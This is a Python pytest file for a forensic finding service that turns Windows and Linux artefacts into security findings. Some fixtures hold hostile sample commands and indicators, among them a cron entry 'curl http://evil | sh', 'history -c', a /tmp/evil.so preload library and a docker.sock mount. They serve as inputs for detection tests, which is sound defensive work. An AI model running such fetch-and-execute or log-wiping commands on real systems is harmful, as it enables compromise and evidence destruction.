"""High-yield pure-function coverage for untested FindingService classifiers.

Targets miss ranges in app/services/finding_service.py that lack dedicated
emit suites: prefetch/srum, journald/systemd, ETL/EFS, AppCompat/DPAPI,
USN, Linux persistence, container, plus a few defensive branches.

Pure classify_* functions need no DB. Emit smoke tests mock the walker
tables / use make_live_db only where ORM value-flow matters for a few
hooks (prefetch, journald).
"""
from __future__ import annotations

import uuid
from datetime import UTC, datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.schemas.finding import Confidence, Severity
from app.services.finding_service import (
    FindingService,
    _format_dbx_evidence,
    classify_appcompat_findings,
    classify_bash_history_findings_persistence,
    classify_container_findings,
    classify_cron_findings_persistence,
    classify_dpapi_findings,
    classify_efs_findings,
    classify_etl_findings,
    classify_journald_findings,
    classify_ld_preload_findings_persistence,
    classify_prefetch_execution_findings,
    classify_srum_findings,
    classify_systemd_findings,
    classify_usnjrnl_findings,
)

# ── defensive / small helpers ────────────────────────────────────────────────


def test_format_dbx_evidence_empty_falls_back():
    assert _format_dbx_evidence(leaf_serial=None, dbx_revocation_kb=None) == (
        "source=microsoft_dbxupdate"
    )


def test_format_dbx_evidence_with_fields():
    out = _format_dbx_evidence(leaf_serial="AA", dbx_revocation_kb="KB5012170")
    assert "leaf_serial=AA" in out
    assert "dbx_revocation_kb=KB5012170" in out


# ── prefetch ────────────────────────────────────────────────────────────────


def test_classify_prefetch_empty_name_returns_empty():
    assert classify_prefetch_execution_findings(
        prefetch_file_path="/x.pf",
        executable_name="",
        run_count=1,
        last_run_time=None,
    ) == []


def test_classify_prefetch_full_fields():
    drafts = classify_prefetch_execution_findings(
        prefetch_file_path="C:\\Windows\\Prefetch\\CMD.EXE-ABC.pf",
        executable_name="CMD.EXE",
        run_count=7,
        last_run_time="2024-01-01T00:00:00",
        version=30,
        prefetch_hash="ABCDEF",
    )
    assert len(drafts) == 1
    d = drafts[0]
    assert d.source == "windows_prefetch_execution"
    assert d.severity == Severity.info
    assert "CMD.EXE" in d.title
    assert "Run count: 7" in d.evidence
    assert "Prefetch version: 30" in d.evidence
    assert "Prefetch hash: ABCDEF" in d.evidence
    assert "run 7 times" in d.description


def test_classify_prefetch_minimal_optional_none():
    drafts = classify_prefetch_execution_findings(
        prefetch_file_path="/x.pf",
        executable_name="NOTEPAD.EXE",
        run_count=None,
        last_run_time=None,
    )
    assert len(drafts) == 1
    assert "Run count" not in drafts[0].evidence


# ── srum ────────────────────────────────────────────────────────────────────


def test_classify_srum_missing_app_returns_empty():
    assert classify_srum_findings(
        record_type="network_data_usage",
        app_identifier=None,
        user_identifier="S-1-5-21-1",
        recorded_at=None,
    ) == []


def test_classify_srum_network_with_bytes_and_path_basename():
    drafts = classify_srum_findings(
        record_type="network_data_usage",
        app_identifier=r"C:\Program Files\App\foo.exe",
        user_identifier="S-1-5-21-1",
        recorded_at="2024-06-01",
        bytes_sent=1000,
        bytes_received=2000,
    )
    assert len(drafts) == 1
    assert drafts[0].source == "windows_srum_network_activity"
    assert "foo.exe" in drafts[0].title
    assert "Bytes sent: 1,000" in drafts[0].evidence
    assert "total bytes transferred" in drafts[0].description


def test_classify_srum_network_connectivity_no_bytes():
    drafts = classify_srum_findings(
        record_type="network_connectivity",
        app_identifier="chrome.exe",
        user_identifier=None,
        recorded_at=None,
    )
    assert drafts[0].source == "windows_srum_network_activity"
    assert "chrome.exe" in drafts[0].title


def test_classify_srum_application_runtime():
    drafts = classify_srum_findings(
        record_type="application_resource_usage",
        app_identifier=r"C:\Windows\System32\svchost.exe",
        user_identifier="S-1-5-18",
        recorded_at="t",
        cpu_foreground_seconds=10,
        cpu_background_seconds=20,
        bytes_read=100,
        bytes_written=200,
    )
    assert len(drafts) == 1
    assert drafts[0].source == "windows_srum_application_runtime"
    assert "svchost.exe" in drafts[0].title
    assert "CPU foreground (s): 10" in drafts[0].evidence


def test_classify_srum_ignored_record_types():
    assert classify_srum_findings(
        record_type="push_notification",
        app_identifier="x",
        user_identifier=None,
        recorded_at=None,
    ) == []
    assert classify_srum_findings(
        record_type="energy_usage",
        app_identifier="x",
        user_identifier=None,
        recorded_at=None,
    ) == []


# ── journald ────────────────────────────────────────────────────────────────


def _journald_base(**flags):
    return dict(
        journal_file_path="/var/log/journal/sys.journal",
        realtime_us=1_700_000_000_000_000,
        message="kernel: OOM killed process foo",
        unit="foo.service",
        pid=1234,
        uid=0,
        hostname="router",
        transport="kernel",
        anomaly_flags=flags,
    )


def test_classify_journald_no_flags_empty():
    assert classify_journald_findings(**_journald_base()) == []


def test_classify_journald_all_five_flags():
    drafts = classify_journald_findings(
        **_journald_base(
            priority_critical=True,
            oom_killer=True,
            suspicious_unit=True,
            log_clear_marker=True,
            selinux_denied=True,
        )
    )
    sources = {d.source for d in drafts}
    assert sources == {
        "linux_journald_priority_critical",
        "linux_journald_oom_killer",
        "linux_journald_suspicious_unit",
        "linux_journald_log_clear",
        "linux_journald_selinux_denied",
    }
    by_src = {d.source: d for d in drafts}
    assert by_src["linux_journald_suspicious_unit"].confidence == Confidence.high
    assert by_src["linux_journald_priority_critical"].confidence == Confidence.low
    assert by_src["linux_journald_oom_killer"].severity == Severity.medium


def test_classify_journald_empty_message_title():
    drafts = classify_journald_findings(
        **{
            **_journald_base(priority_critical=True),
            "message": "",
            "unit": None,
            "hostname": None,
        }
    )
    assert "(empty)" in drafts[0].title


# ── systemd ─────────────────────────────────────────────────────────────────


def _systemd_base(**flags):
    return dict(
        unit_path="/tmp/evil.service",
        unit_type="service",
        unit_name="evil",
        description="dropper",
        exec_start="/tmp/x.sh",
        user="root",
        working_directory="/tmp",
        wanted_by=["custom.target"],
        required_by=[],
        requires=[],
        enabled=True,
        socket_listen={"ListenStream": "1337"},
        anomaly_flags=flags,
    )


def test_classify_systemd_no_flags_empty():
    assert classify_systemd_findings(**_systemd_base()) == []


def test_classify_systemd_all_five_flags():
    drafts = classify_systemd_findings(
        **_systemd_base(
            suspicious_path=True,
            obfuscated_exec=True,
            socket_unusual_port=True,
            root_minimal_deps=True,
            enabled_outside_standard=True,
        )
    )
    sources = {d.source for d in drafts}
    assert len(sources) == 5
    assert "linux_systemd_suspicious_path" in sources
    assert "linux_systemd_obfuscated_exec" in sources
    highs = [d for d in drafts if d.confidence == Confidence.high]
    assert len(highs) >= 2


def test_classify_systemd_none_optional_fields():
    drafts = classify_systemd_findings(
        unit_path="/u.service",
        unit_type="service",
        unit_name="u",
        description=None,
        exec_start=None,
        user=None,
        working_directory=None,
        wanted_by=None,
        required_by=None,
        requires=None,
        enabled=False,
        socket_listen=None,
        anomaly_flags={"root_minimal_deps": True},
    )
    assert len(drafts) == 1
    assert "(none)" in drafts[0].evidence


# ── ETL ─────────────────────────────────────────────────────────────────────


def _etl_base(**flags):
    return dict(
        etl_file_path="/Windows/System32/LogFiles/WMI/AutoLogger.etl",
        etl_session_name="AutoLogger-Diagtrack-Listener",
        provider_guid="{1234}",
        provider_name="Microsoft-Windows-Kernel-Process",
        event_id=1,
        event_opcode=1,
        timestamp_ft=132000000000000000,
        process_id=42,
        thread_id=7,
        anomaly_flags=flags,
    )


def test_classify_etl_no_flags_empty():
    assert classify_etl_findings(**_etl_base()) == []


def test_classify_etl_all_flags_unusual_suppressed_when_diagtrack():
    drafts = classify_etl_findings(
        **_etl_base(
            kernel_proc_after_evtx_clear=True,
            provider_disable_evidence=True,
            non_microsoft_in_diagtrack=True,
            unusual_provider=True,  # suppressed when diagtrack also set
        )
    )
    sources = {d.source for d in drafts}
    assert "windows_etl_kernel_proc_after_clear" in sources
    assert "windows_etl_provider_disabled" in sources
    assert "windows_etl_non_microsoft_in_diagtrack" in sources
    assert "windows_etl_unusual_provider" not in sources


def test_classify_etl_unusual_provider_alone():
    drafts = classify_etl_findings(**_etl_base(unusual_provider=True))
    assert len(drafts) == 1
    assert drafts[0].source == "windows_etl_unusual_provider"
    assert drafts[0].confidence == Confidence.medium


def test_classify_etl_null_optionals_in_evidence():
    drafts = classify_etl_findings(
        etl_file_path="/x.etl",
        etl_session_name=None,
        provider_guid=None,
        provider_name=None,
        event_id=None,
        event_opcode=None,
        timestamp_ft=0,
        process_id=None,
        thread_id=None,
        anomaly_flags={"provider_disable_evidence": True},
    )
    assert "unknown provider" in drafts[0].title
    assert "Event opcode: (unknown)" in drafts[0].evidence


# ── EFS ─────────────────────────────────────────────────────────────────────


def _efs_base(**flags):
    return dict(
        file_path=r"C:\Users\a\secret.txt",
        file_size=4096,
        mft_record_number=100,
        efs_attribute_size=512,
        ddf_user_count=0,
        drf_recovery_agent_count=3,
        ddf_users=[
            {"sid": "S-1-5-21-1", "cert_thumbprint": "aa" * 20, "friendly_name": "alice"},
            "bad",  # skipped in preview
            {"schema_version": 1},  # stripped
        ],
        drf_recovery_agents=[
            {"sid": "S-1-5-21-2", "cert_thumbprint": "bb" * 20, "friendly_name": "dra"},
            {"schema_version": 1},
        ],
        anomaly_flags=flags,
    )


def test_classify_efs_all_four_flags():
    drafts = classify_efs_findings(
        **_efs_base(
            orphaned_drf=True,
            unusual_recovery_agent=True,
            domain_admin_in_ddf=True,
            large_drf=True,
        )
    )
    sources = {d.source for d in drafts}
    assert sources == {
        "windows_efs_orphaned_drf",
        "windows_efs_unusual_recovery_agent",
        "windows_efs_domain_admin_in_ddf",
        "windows_efs_large_drf",
    }


def test_classify_efs_orphan_path_fallback_to_mft():
    drafts = classify_efs_findings(
        **{
            **_efs_base(orphaned_drf=True),
            "file_path": None,
            "file_size": None,
            "ddf_users": [],
            "drf_recovery_agents": [],
        }
    )
    assert "MFT#100" in drafts[0].title


# ── AppCompat ───────────────────────────────────────────────────────────────


def test_classify_appcompat_suspicious_and_temp():
    drafts = classify_appcompat_findings(
        file_path=r"C:\Users\Public\evil.exe",
        insertion_position=100,
        last_modified_ts=None,
        source_hive_path=r"C:\Windows\System32\config\SYSTEM",
        control_set=1,
        anomaly_flags={"suspicious_path": True, "temp_execution": True},
    )
    sources = {d.source for d in drafts}
    assert "windows_appcompat_suspicious_path" in sources
    assert "windows_appcompat_temp_execution" in sources


def test_classify_appcompat_recent_baseline_mru():
    recent = datetime.utcnow().replace(tzinfo=UTC) - timedelta(days=2)
    drafts = classify_appcompat_findings(
        file_path=r"C:\Windows\System32\cmd.exe",
        insertion_position=3,
        last_modified_ts=recent,
        source_hive_path=None,
        control_set=None,
        anomaly_flags={},
        mru_threshold=16,
    )
    assert any(d.source == "windows_appcompat_recent_baseline" for d in drafts)


def test_classify_appcompat_old_mru_skips_baseline():
    old = datetime.utcnow().replace(tzinfo=UTC) - timedelta(days=90)
    drafts = classify_appcompat_findings(
        file_path=r"C:\Windows\System32\cmd.exe",
        insertion_position=1,
        last_modified_ts=old,
        source_hive_path=None,
        control_set=None,
        anomaly_flags={},
    )
    assert drafts == []


def test_classify_appcompat_null_path_title():
    drafts = classify_appcompat_findings(
        file_path=None,
        insertion_position=50,
        last_modified_ts=None,
        source_hive_path=None,
        control_set=None,
        anomaly_flags={"suspicious_path": True},
    )
    assert "MRU#50" in drafts[0].title


# ── DPAPI ───────────────────────────────────────────────────────────────────


def test_classify_dpapi_all_three_flags():
    drafts = classify_dpapi_findings(
        master_key_guid="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
        creator_sid="S-1-5-21-1-2-3-500",
        file_size_bytes=4096,
        hmac_iterations=8000,
        salt_size=16,
        last_modified_ts=datetime(2024, 1, 1, tzinfo=UTC),
        source_file_path=r"C:\Users\x\AppData\Roaming\Microsoft\Protect\S-1-5\guid",
        anomaly_flags={
            "orphaned_masterkey": True,
            "admin_creator_sid": True,
            "large_masterkey": True,
        },
    )
    sources = {d.source for d in drafts}
    assert sources == {
        "windows_dpapi_orphaned_masterkey",
        "windows_dpapi_admin_creator_sid",
        "windows_dpapi_large_masterkey",
    }
    assert all("Master-key GUID" in d.evidence for d in drafts)


def test_classify_dpapi_null_fields_evidence():
    drafts = classify_dpapi_findings(
        master_key_guid=None,
        creator_sid=None,
        file_size_bytes=None,
        hmac_iterations=None,
        salt_size=None,
        last_modified_ts=None,
        source_file_path=None,
        anomaly_flags={"orphaned_masterkey": True},
    )
    assert "(unknown GUID)" in drafts[0].title
    assert "HMAC iterations: (body preamble absent" in drafts[0].evidence


# ── USN journal ─────────────────────────────────────────────────────────────


def test_classify_usnjrnl_temp_create_delete_pair():
    drafts = classify_usnjrnl_findings(
        usn=100,
        file_name="payload.exe",
        parent_path=r"C:\Users\x\AppData\Local\Temp",
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        reason_flags={"file_create": True, "file_delete": True, "_raw": 1},
        source_file_path=r"\\.\C:",
        in_temp_path=True,
        paired_create_delete=True,
    )
    assert len(drafts) == 1
    assert drafts[0].source == "windows_usnjrnl_temp_create_delete_pair"
    assert drafts[0].confidence == Confidence.high


def test_classify_usnjrnl_file_deletion_executable():
    drafts = classify_usnjrnl_findings(
        usn=200,
        file_name="malware.dll",
        parent_path=r"C:\Windows\Temp",
        timestamp=None,
        reason_flags={"file_delete": True},
        source_file_path=None,
        in_temp_path=False,
        paired_create_delete=False,
    )
    assert len(drafts) == 1
    assert drafts[0].source == "windows_usnjrnl_file_deletion"


def test_classify_usnjrnl_deletion_suppressed_when_pair_fires():
    drafts = classify_usnjrnl_findings(
        usn=1,
        file_name="x.exe",
        parent_path=r"C:\Temp",
        timestamp=None,
        reason_flags={"file_delete": True},
        source_file_path=None,
        in_temp_path=True,
        paired_create_delete=True,
    )
    sources = {d.source for d in drafts}
    assert "windows_usnjrnl_temp_create_delete_pair" in sources
    assert "windows_usnjrnl_file_deletion" not in sources


def test_classify_usnjrnl_renamed_executable():
    drafts = classify_usnjrnl_findings(
        usn=3,
        file_name="payload.exe",
        parent_path=r"C:\Users\Public",
        timestamp=None,
        reason_flags={"rename_new_name": True},
        source_file_path=None,
        rename_extension_changed=True,
        paired_old_name="payload.tmp",
    )
    assert drafts[0].source == "windows_usnjrnl_renamed_executable"
    assert "payload.tmp" in drafts[0].title


def test_classify_usnjrnl_non_exec_delete_no_finding():
    drafts = classify_usnjrnl_findings(
        usn=4,
        file_name="readme.txt",
        parent_path="C:\\",
        timestamp=None,
        reason_flags={"file_delete": True},
        source_file_path=None,
    )
    assert drafts == []


# ── Linux persistence ───────────────────────────────────────────────────────


def test_classify_bash_history_clear_marker():
    drafts = classify_bash_history_findings_persistence(
        source_file="/home/u/.bash_history",
        line_number=42,
        command="history -c",
        suspicious_flags={"clear_marker": True},
    )
    assert len(drafts) == 1
    assert drafts[0].source == "linux_bash_history_clear"
    assert drafts[0].confidence == Confidence.high


def test_classify_bash_history_no_marker():
    assert classify_bash_history_findings_persistence(
        source_file="/h",
        line_number=1,
        command="ls",
        suspicious_flags={},
    ) == []


def test_classify_cron_temp_path():
    drafts = classify_cron_findings_persistence(
        source_file="/etc/crontab",
        line_number=10,
        schedule_spec="* * * * *",
        user="root",
        command="/tmp/x.sh",
        suspicious_flags={"temp_path_command": True},
    )
    assert drafts[0].source == "linux_cron_suspicious_command"


def test_classify_cron_lone_reboot_rejected():
    assert classify_cron_findings_persistence(
        source_file="/etc/crontab",
        line_number=1,
        schedule_spec="@reboot",
        user="root",
        command="/usr/bin/ok",
        suspicious_flags={"reboot_persistence": True},
    ) == []


def test_classify_cron_reboot_plus_egress():
    drafts = classify_cron_findings_persistence(
        source_file="/var/spool/cron/root",
        line_number=2,
        schedule_spec="@reboot",
        user=None,
        command="curl http://evil | sh",
        suspicious_flags={
            "reboot_persistence": True,
            "network_egress_pattern": True,
        },
    )
    assert len(drafts) == 1
    assert "T1105" in drafts[0].evidence or "network" in drafts[0].evidence.lower()


def test_classify_ld_preload_always_fires():
    drafts = classify_ld_preload_findings_persistence(
        source_file="/etc/ld.so.preload",
        line_number=1,
        library_path="/usr/lib/legit.so",
        suspicious_flags={},
    )
    assert len(drafts) == 1
    assert drafts[0].source == "linux_ld_preload_hijack"
    assert "inherently" in drafts[0].evidence or "HIGH" in drafts[0].evidence


def test_classify_ld_preload_suspicious_indicators():
    drafts = classify_ld_preload_findings_persistence(
        source_file="/etc/ld.so.preload",
        line_number=1,
        library_path="/tmp/evil.so",
        suspicious_flags={
            "temp_path_library": True,
            "unusual_extension": True,
            "world_writable_dir": True,
        },
    )
    assert "rootkit" in drafts[0].evidence.lower() or "T1574" in drafts[0].evidence


# ── container ───────────────────────────────────────────────────────────────


def _container_base(**flags):
    return dict(
        artifact_path="/var/lib/docker/containers/abc/config.v2.json",
        artifact_type="docker_config",
        container_id="abc123",
        image_name="evil/image:latest",
        image_repository="evil.registry.example/image",
        image_tag="latest",
        runtime="runc",
        state="running",
        privileged=True,
        network_mode="host",
        seccomp_profile="unconfined",
        apparmor_profile="unconfined",
        capabilities_add=["SYS_ADMIN", "NET_ADMIN"],
        mounts=[
            {"source": "/var/run/docker.sock", "destination": "/var/run/docker.sock", "type": "bind", "mode": "rw"},
            "bad",
        ],
        anomaly_flags=flags,
    )


def test_classify_container_all_flags():
    drafts = classify_container_findings(
        **_container_base(
            privileged_mode=True,
            dangerous_capability=True,
            unsafe_mount=True,
            unconfined_seccomp=True,
            unconfined_apparmor=True,
            unknown_registry=True,
        )
    )
    sources = {d.source for d in drafts}
    assert "linux_container_privileged_mode" in sources
    assert "linux_container_dangerous_capability" in sources
    assert "linux_container_unsafe_host_mount" in sources
    assert "linux_container_unconfined_security" in sources
    assert "linux_container_unknown_registry_image" in sources


def test_classify_container_no_flags_empty():
    assert classify_container_findings(**_container_base()) == []


def test_classify_container_null_identity_falls_back_to_path():
    drafts = classify_container_findings(
        **{
            **_container_base(privileged_mode=True),
            "image_name": None,
            "container_id": None,
            "mounts": None,
            "capabilities_add": None,
        }
    )
    assert drafts[0].title.endswith(_container_base()["artifact_path"]) or (
        "artifact" in drafts[0].title.lower()
        or _container_base()["artifact_path"] in drafts[0].title
    )


# ── emit hooks (mock row sources / live create) ─────────────────────────────


def _mock_db_with_rows(rows):
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    result = MagicMock()
    result.scalars.return_value.all.return_value = rows
    db.execute = AsyncMock(return_value=result)
    return db


@pytest.mark.asyncio
async def test_emit_prefetch_findings_from_walk_with_mock_rows():
    """Exercises emit loop; create() is real path on a mock session."""
    record = SimpleNamespace(
        prefetch_file_path="/x.pf",
        executable_name="CMD.EXE",
        run_count=2,
        last_run_time=None,
        version=26,
        prefetch_hash="hh",
    )
    db = _mock_db_with_rows([record])
    project_id = uuid.uuid4()
    firmware_id = uuid.uuid4()
    emitted = await FindingService(db).emit_prefetch_findings_from_walk(
        project_id, firmware_id
    )
    assert len(emitted) == 1
    db.add.assert_called()
    added = db.add.call_args[0][0]
    assert added.source == "windows_prefetch_execution"
    assert added.confidence == "low"
    assert added.firmware_id == firmware_id


@pytest.mark.asyncio
async def test_emit_srum_findings_from_walk_with_mock_rows():
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    record = SimpleNamespace(
        record_type="network_data_usage",
        app_identifier="app.exe",
        user_identifier=None,
        recorded_at=None,
        bytes_sent=10,
        bytes_received=20,
        bytes_read=None,
        bytes_written=None,
        cpu_foreground_seconds=None,
        cpu_background_seconds=None,
        source_path="/SRUDB.dat",
    )
    result = MagicMock()
    result.scalars.return_value.all.return_value = [record]
    db.execute = AsyncMock(return_value=result)
    svc = FindingService(db)
    emitted = await svc.emit_srum_findings_from_walk(uuid.uuid4(), uuid.uuid4())
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "windows_srum_network_activity"


@pytest.mark.asyncio
async def test_emit_journald_findings_from_walk_with_mock_rows():
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    record = SimpleNamespace(
        journal_file_path="/var/log/journal/x",
        realtime_timestamp_us=1,
        message="oom",
        unit="/tmp/x.service",
        pid=1,
        uid=0,
        hostname="h",
        transport="kernel",
        anomaly_flags={"oom_killer": True, "suspicious_unit": True},
    )
    result = MagicMock()
    result.scalars.return_value.all.return_value = [record]
    db.execute = AsyncMock(return_value=result)
    svc = FindingService(db)
    with patch(
        "app.services.jsonb_normalizers._normalize_linux_journald_entries_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await svc.emit_journald_findings_from_walk(uuid.uuid4(), uuid.uuid4())
    assert len(emitted) == 2
    sources = {db.add.call_args_list[i][0][0].source for i in range(len(emitted))}
    assert "linux_journald_oom_killer" in sources
    assert "linux_journald_suspicious_unit" in sources


@pytest.mark.asyncio
async def test_emit_systemd_findings_from_walk_with_mock_rows():
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    record = SimpleNamespace(
        unit_path="/tmp/e.service",
        unit_type="service",
        unit_name="e",
        description=None,
        exec_start="/tmp/x",
        user="root",
        working_directory=None,
        wanted_by=["multi-user.target"],
        required_by=[],
        requires=[],
        enabled=True,
        socket_listen={},
        anomaly_flags={"suspicious_path": True},
    )
    result = MagicMock()
    result.scalars.return_value.all.return_value = [record]
    db.execute = AsyncMock(return_value=result)

    with patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_wanted_by",
        side_effect=lambda x: x or [],
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_required_by",
        side_effect=lambda x: x or [],
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_requires",
        side_effect=lambda x: x or [],
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_socket_listen",
        side_effect=lambda x: x or {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_systemd_units_after",
        side_effect=lambda x: x,
    ):
        svc = FindingService(db)
        emitted = await svc.emit_systemd_findings_from_walk(uuid.uuid4(), uuid.uuid4())
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "linux_systemd_suspicious_path"


@pytest.mark.asyncio
async def test_emit_container_findings_from_walk_with_mock_rows():
    record = SimpleNamespace(
        artifact_path="/var/lib/docker/c/config.json",
        artifact_type="docker_config",
        container_id="c1",
        image_name="img",
        image_repository="private.reg/img",
        image_tag="v1",
        runtime="runc",
        state="running",
        privileged=True,
        network_mode="bridge",
        seccomp_profile="default",
        apparmor_profile="default",
        capabilities_add=["SYS_ADMIN"],
        mounts=[],
        anomaly_flags={"privileged_mode": True, "dangerous_capability": True},
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_linux_container_artifacts_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_container_artifacts_capabilities_add",
        side_effect=lambda x: x or [],
    ), patch(
        "app.services.jsonb_normalizers._normalize_linux_container_artifacts_mounts",
        side_effect=lambda x: x or [],
    ):
        emitted = await FindingService(db).emit_container_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 2


@pytest.mark.asyncio
async def test_emit_r2r_stomp_missing_firmware_returns_empty():
    db = AsyncMock()
    result = MagicMock()
    result.scalar_one_or_none.return_value = None
    db.execute = AsyncMock(return_value=result)
    svc = FindingService(db)
    out = await svc.emit_r2r_stomp_findings_from_decompile(uuid.uuid4(), uuid.uuid4())
    assert out == []


@pytest.mark.asyncio
async def test_emit_r2r_stomp_with_bundles():
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    fw = SimpleNamespace(
        id=uuid.uuid4(),
        dotnet_decompile_result={
            "bundles": [
                {"bundle_path": "/a.dll", "decompile_target_dir": "/tmp/d"},
                "skip",
                {"bundle_path": None},
            ]
        },
    )
    # first execute = select firmware; subsequent = delete + creates
    sel = MagicMock()
    sel.scalar_one_or_none.return_value = fw
    db.execute = AsyncMock(return_value=sel)

    draft = SimpleNamespace(
        confidence_tier=1,
        severity="medium",
        title="R2R stomp",
        description="d",
        evidence="e",
        pe_path="/a.dll",
        source="windows_r2r_stomp",
    )
    draft2 = SimpleNamespace(
        confidence_tier=2,
        severity="high",
        title="R2R stomp2",
        description="d",
        evidence="e",
        pe_path="/a.dll",
        source="windows_il_capa",
    )
    draft3 = SimpleNamespace(
        confidence_tier=3,
        severity="critical",
        title="R2R stomp3",
        description="d",
        evidence="e",
        pe_path="/a.dll",
        source="windows_r2r_stomp",
    )
    with patch(
        "app.services.jsonb_normalizers._normalize_firmware_dotnet_decompile_result",
        side_effect=lambda x: x or {},
    ), patch(
        "app.services.r2r_stomping.classify_r2r_stomp_findings",
        return_value=[draft, draft2, draft3],
    ):
        svc = FindingService(db)
        emitted = await svc.emit_r2r_stomp_findings_from_decompile(
            uuid.uuid4(), fw.id
        )
    assert len(emitted) == 3


@pytest.mark.asyncio
async def test_emit_evtx_missing_firmware_returns_empty():
    db = AsyncMock()
    result = MagicMock()
    result.scalar_one_or_none.return_value = None
    db.execute = AsyncMock(return_value=result)
    svc = FindingService(db)
    assert await svc.emit_evtx_findings_from_walk(uuid.uuid4(), uuid.uuid4()) == []


@pytest.mark.asyncio
async def test_emit_evtx_empty_per_file_returns_empty():
    db = AsyncMock()
    fw = SimpleNamespace(id=uuid.uuid4(), evtx_walk_result={"per_file": []})
    sel = MagicMock()
    sel.scalar_one_or_none.return_value = fw
    db.execute = AsyncMock(return_value=sel)
    with patch(
        "app.services.jsonb_normalizers._normalize_firmware_evtx_walk_result",
        return_value={"per_file": []},
    ):
        svc = FindingService(db)
        assert await svc.emit_evtx_findings_from_walk(uuid.uuid4(), fw.id) == []


@pytest.mark.asyncio
async def test_emit_evtx_classifies_eids():
    db = AsyncMock()
    db.add = MagicMock()
    db.flush = AsyncMock()
    fw = SimpleNamespace(id=uuid.uuid4(), evtx_walk_result={})
    sel = MagicMock()
    sel.scalar_one_or_none.return_value = fw
    db.execute = AsyncMock(return_value=sel)

    records = [
        {
            "raw_xml": (
                '<Event><System><Provider Name="Microsoft-Windows-Sysmon"/>'
                "<EventID>1</EventID></System></Event>"
            ),
            "record_num": 1,
        },
        {
            "raw_xml": "<Event><System><EventID>4624</EventID></System></Event>",
            "record_num": 2,
        },
        {
            "raw_xml": "<Event><System><EventID>4625</EventID></System></Event>",
            "record_num": 3,
        },
        {
            "raw_xml": (
                "<Event><System><EventID>4104</EventID></System>"
                "<EventData><Data>FromBase64String</Data></EventData></Event>"
            ),
            "record_num": 4,
        },
        {
            "raw_xml": "<Event><System><EventID>9999</EventID></System></Event>",
            "record_num": 5,
        },
        {"raw_xml": "<Event>no id</Event>", "record_num": 6},
    ]
    with patch(
        "app.services.jsonb_normalizers._normalize_firmware_evtx_walk_result",
        return_value={
            "per_file": [
                {"path": "/logs/Security.evtx", "status": "ok"},
                {"path": None, "status": "ok"},
                {"path": "/bad.evtx", "status": "error"},
                "skip",
            ]
        },
    ), patch(
        "app.services.evtx_service.parse_evtx_file",
        return_value={"records": records},
    ):
        svc = FindingService(db)
        emitted = await svc.emit_evtx_findings_from_walk(uuid.uuid4(), fw.id)
    # Sysmon 1 + 4624 + 4625 + 4104 = 4 (9999 skipped, no-id skipped)
    assert len(emitted) == 4
    sources = {c[0][0].source for c in db.add.call_args_list}
    assert "windows_sysmon_proc_create" in sources
    assert "windows_logon_success" in sources
    assert "windows_logon_failure" in sources
    assert "windows_powershell_script_block" in sources


@pytest.mark.asyncio
async def test_emit_etl_findings_from_walk_with_mock_rows():
    record = SimpleNamespace(
        etl_file_path="/x.etl",
        etl_session_name="Diagtrack",
        provider_guid="{g}",
        provider_name="ThirdParty",
        event_id=1,
        event_opcode=2,
        timestamp_ft=1,
        process_id=9,
        thread_id=1,
        anomaly_flags={"unusual_provider": True},
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_windows_etl_events_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await FindingService(db).emit_etl_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "windows_etl_unusual_provider"


@pytest.mark.asyncio
async def test_emit_efs_findings_from_walk_with_mock_rows():
    record = SimpleNamespace(
        file_path=r"C:\secret.txt",
        file_size=1,
        mft_record_number=1,
        efs_attribute_size=64,
        ddf_user_count=0,
        drf_recovery_agent_count=3,
        ddf_users=[],
        drf_recovery_agents=[],
        anomaly_flags={"orphaned_drf": True},
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_windows_efs_encrypted_files_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ), patch(
        "app.services.jsonb_normalizers._normalize_windows_efs_encrypted_files_ddf_users",
        side_effect=lambda x: x or [],
    ), patch(
        "app.services.jsonb_normalizers._normalize_windows_efs_encrypted_files_drf_recovery_agents",
        side_effect=lambda x: x or [],
    ):
        emitted = await FindingService(db).emit_efs_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 1
    assert db.add.call_args[0][0].source == "windows_efs_orphaned_drf"


@pytest.mark.asyncio
async def test_emit_appcompat_findings_from_walk_with_mock_rows():
    record = SimpleNamespace(
        file_path=r"C:\Users\Public\x.exe",
        insertion_position=1,
        last_modified_ts=None,
        source_hive_path="/SYSTEM",
        control_set=1,
        anomaly_flags={"suspicious_path": True},
    )
    db = _mock_db_with_rows([record])
    with patch(
        "app.services.jsonb_normalizers._normalize_windows_appcompat_entries_anomaly_flags",
        side_effect=lambda x: x if isinstance(x, dict) else {},
    ):
        emitted = await FindingService(db).emit_appcompat_findings_from_walk(
            uuid.uuid4(), uuid.uuid4()
        )
    assert len(emitted) == 1
